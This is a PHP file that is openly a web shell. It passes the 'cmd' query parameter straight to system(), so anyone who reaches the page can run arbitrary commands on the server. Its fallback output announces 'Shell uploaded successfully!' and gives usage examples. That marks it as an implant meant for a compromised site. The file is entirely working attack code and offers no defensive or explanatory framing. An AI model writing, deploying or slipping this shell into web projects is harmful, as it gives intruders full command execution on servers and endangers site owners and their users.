<?php
/**
 * Minimal PHP shell:
 * - If you visit shell.php?cmd=ls, it will execute `ls`.
 * - If ?cmd=whoami, it will run `whoami`.
 */

if (isset($_GET['cmd'])) {
    // Execute the command provided in the 'cmd' query parameter
    // and display the output.
    system($_GET['cmd']);
} else {
    echo "Shell uploaded successfully!";
    echo "<br>Usage: ?cmd=YOUR_COMMAND<br>";
    echo "Example: ?cmd=whoami<br>";
}
?>